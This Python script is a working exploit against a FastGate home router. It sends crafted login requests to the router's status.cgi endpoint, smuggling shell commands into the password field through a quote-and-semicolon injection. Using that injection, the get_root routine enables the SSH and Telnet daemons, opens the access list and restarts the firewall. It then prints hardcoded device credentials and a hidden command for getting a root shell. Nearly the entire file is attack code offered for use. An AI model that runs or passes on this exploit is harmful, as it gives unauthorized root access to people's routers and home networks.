from __future__ import print_function

import random
import string
import time

import requests


def random_string(length):
    letters = string.ascii_letters + string.digits
    return ''.join(random.choice(letters) for i in range(length))


class FastGateHTTP(object):
    def __init__(self, host="192.168.1.254", port=80):
        self.host = host
        self.port = port
        self.seed = "{}pytester{}".format(int(time.time()), random_string(12))
        self.session_key = "NULL"
        self.base_url = "/status.cgi"
        self.base_params = lambda: {
            "_": self.seed,
            "sessionKey": self.session_key
        }
        self.headers = {"X-XSRF-TOKEN": "ciao", "DNT": "1"}
        self.cookies = {"XSRF-TOKEN": "ciao"}

    def request(self, method, params={}, cookies={}, headers={}, **kwargs):
        _params = self.base_params()
        _params.update(params)
        _cookies = self.cookies.copy()
        _cookies.update(cookies)
        _headers = self.headers.copy()
        _headers.update(headers)

        url = "http://{host}:{port}{path}".format(host=self.host, port=self.port, path=self.base_url)

        return requests.request(method, url, params=_params, headers=_headers, cookies=_cookies, **kwargs)

    def get(self, *a, **kw):
        return self.request("GET", *a, **kw)

    def post(self, *a, **kw):
        return self.request("POST", *a, **kw)

    def login(self, user, passwd):
        params = {
            "cmd": "3",
            "nvget": "login_confirm",
            "username": user,
            "password": passwd
        }

        return self.get(params=params)

    def check_login(self, user, passwd):
        r = self.login(user, passwd)
        self.session_key = r.json()["login_confirm"]["check_session"]

        r = self.get(params={
            "cmd": "4",
            "nvget": "login_confirm"
        })

        return str(r.json()["login_confirm"]["login_status"]) == "1"

    def shell(self, cmd):
        cmd = "'; {} ; #".format(cmd)
        return self.login("culo", cmd)


class FastGateExploit(FastGateHTTP):
    def get_root(self):
        print("Enabling SSH and Telnet daemons on local network")
        self.shell("/usr/sbin/stnvram set CWMPX_FASTWEB_AppCfgSshdAllowIF LAN ; /usr/sbin/stnvram commit")
        time.sleep(1)
        print("Granting access to SSH and Telnet from local network")
        self.shell("/usr/sbin/stnvram set CWMPX_FASTWEB_AppCfgTelnet_SSH_ACL 192.168.1.0/16 ; /usr/sbin/stnvram commit")
        time.sleep(1)
        print("Restarting SSH daemon")
        self.shell(
            "PATH='/home/bin:/home/scripts:/opt/bin:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/jamvm/bin:/opt/scripts' "
            "/usr/sbin/rc_task sshd restart")
        time.sleep(2)
        print("Restarting Telnet daemon")
        self.shell(
            "PATH='/home/bin:/home/scripts:/opt/bin:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/jamvm/bin:/opt/scripts' "
            "/usr/sbin/rc_task telnet restart")
        time.sleep(2)
        print("Restarting firewall")
        self.shell(
            "PATH='/home/bin:/home/scripts:/opt/bin:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/jamvm/bin:/opt/scripts' "
            "/usr/sbin/rc_task firewall restart")

        print("You should now be able to ssh/telnet {host}".format(host=self.host))
        print("ssh lanadmin@{host} (password: 'lanpasswd')".format(host=self.host))
        print()
        print("Once you get to the st_shell, execute the 'sh' hidden command to get a root shell.")
        print("Try following the following login information:")
        print("User: lanadmin\tPasswd: lanpasswd")
        print("User: FASTGate\tPasswd: Testplant123")
